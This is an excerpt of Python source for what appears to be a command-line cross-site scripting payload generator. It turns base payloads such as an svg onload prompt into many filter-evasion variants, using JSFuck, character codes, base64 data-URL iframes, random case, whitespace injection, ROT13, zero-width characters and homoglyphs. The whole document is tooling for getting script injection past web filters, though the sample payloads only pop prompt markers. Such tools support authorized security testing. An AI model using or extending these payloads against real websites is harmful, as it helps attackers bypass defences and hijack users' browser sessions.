...
def jsfuck_encode(s):
    ...
    for char in s.lower():
        if char in jsfuck_map:
            ...
            result.append(
                f'[]["constructor"]["constructor"]("return String.fromCharCode({ord(char)})")()'
            )
...
def inject_random_whitespace(payload):
    return re.sub(
        r"(\w)", lambda m: m.group(1) + random.choice(["\t", "\n", "\r", " "]), payload
    )
...
def random_case(s):
    return "".join(
        random.choice([c.lower(), c.upper()]) if c.isalpha() else c for c in s
    )
...
def wrap_in_data_url(payload):
    return (
        f'<iframe src="data:text/html,{payload}">'  # Could extend to Base64 if needed
    )
...
def generate_payloads(
    ...
    if variant_filters and any(variant_filters.values()):
        ...
        variant_functions = {
            k: v for k, v in variant_functions.items() if k in selected_variants
        }
    ...
    len(variant_functions)  # Total number of variants

    for base in base_payloads:
        base_replaced = base.replace(
            "{b64}", base64.b64encode(b"<svg onload=prompt(1)></svg>").decode()
        )

        if "{charcodes}" in base:
            base_replaced = base_replaced.replace(
                "{charcodes}", ",".join(str(ord(c)) for c in f"prompt('XSS-{counter}')")
            )

        # Apply all variant functions dynamically
        for _variant_name, variant_function in variant_functions.items():
            # Generate two variants for each encoding: string and numeric

            # Variant 1: String format (XSS{n})
            base_with_string = (
                base_replaced.replace("{n}", f"'XSS{counter}'")
                .replace("AMITCOUNT", f"'XSS{counter}'")
                .replace("(1)", f"('XSS{counter}')")
                .replace("XSS", f"XSS-{counter}")
            )
            ...
            base_with_numeric = (
                base_replaced.replace("{n}", str(counter))
                .replace("AMITCOUNT", str(counter))
                .replace("(1)", f"({counter})")
                .replace("XSS", f"XSS-{counter}")
            )
    ...
    return (
        ...
        num_base_payloads,
        len(all_payloads),
    )  # Return base count and output count


def write_to_file(payloads, filename):
    with open(filename, "w", encoding="utf-8") as f:
        for _counter, p in payloads:
            f.write(p + "\n")


def cli():
    get_colorful_ascii_art()
...
As a module:
  ...
  payloads = generate_payloads('<script>', '</script>', encode_prefix=True, encode_suffix=True)
    ...
    parser.add_argument(
        "-f", "--filter", default="", help="Filter type (e.g. html-encoded)"
    )
    parser.add_argument(
        "-p", "--prefix", default="", help="Prefix to wrap each payload"
    )
    parser.add_argument(
        "-s", "--suffix", default="", help="Suffix to wrap each payload"
    )
    parser.add_argument(
        "--ep",
        "--encode-prefix",
    ...
    parser.add_argument(
        "-n", "--no-output", action="store_true", help="Do not write to output file"
    )
    parser.add_argument(
        "-u",
        "--url-obfuscate",
        action="store_true",
        help="Wrap payloads in a data:text/html iframe",
    )
    parser.add_argument(
        "-c",
        "--charcode",
        action="store_true",
        help="Generate only String.fromCharCode obfuscated payloads",
    )
    parser.add_argument(
        "-j", "--jsfuck", action="store_true", help="Generate JSFuck encoded payloads"
    )
    parser.add_argument(
    ...
    parser.add_argument(
        "-r", "--rot13", action="store_true", help="Generate ROT13 obfuscated payloads"
    )
    parser.add_argument(
    ...
    parser.add_argument(
        ...
        "--asciihex",
        action="store_true",
        help="Generate ASCII hex encoded payloads",
    )
    parser.add_argument(
    ...
    parser.add_argument(
        ...
        "--percentall",
        action="store_true",
        help="Generate percent-encoded (all chars) payloads",
    )
    parser.add_argument(
        "-hn",
        "--htmlnamed",
    ...
    parser.add_argument(
        ...
        "--concatsplit",
        action="store_true",
        help="Generate concatenated/split payloads",
    )
    parser.add_argument(
        "-R", "--reverse", action="store_true", help="Generate reversed payloads"
    )
    parser.add_argument(
        "-cv", "--casevar", action="store_true", help="Generate case variation payloads"
    )
    parser.add_argument(
        "-l", "--leet", action="store_true", help="Generate leet speak payloads"
    )
    parser.add_argument(
        "-zw",
        "--zerowidth",
        action="store_true",
        help="Generate zero-width character payloads",
    )
    parser.add_argument(
        "-hg", "--homoglyph", action="store_true", help="Generate homoglyph payloads"
    )
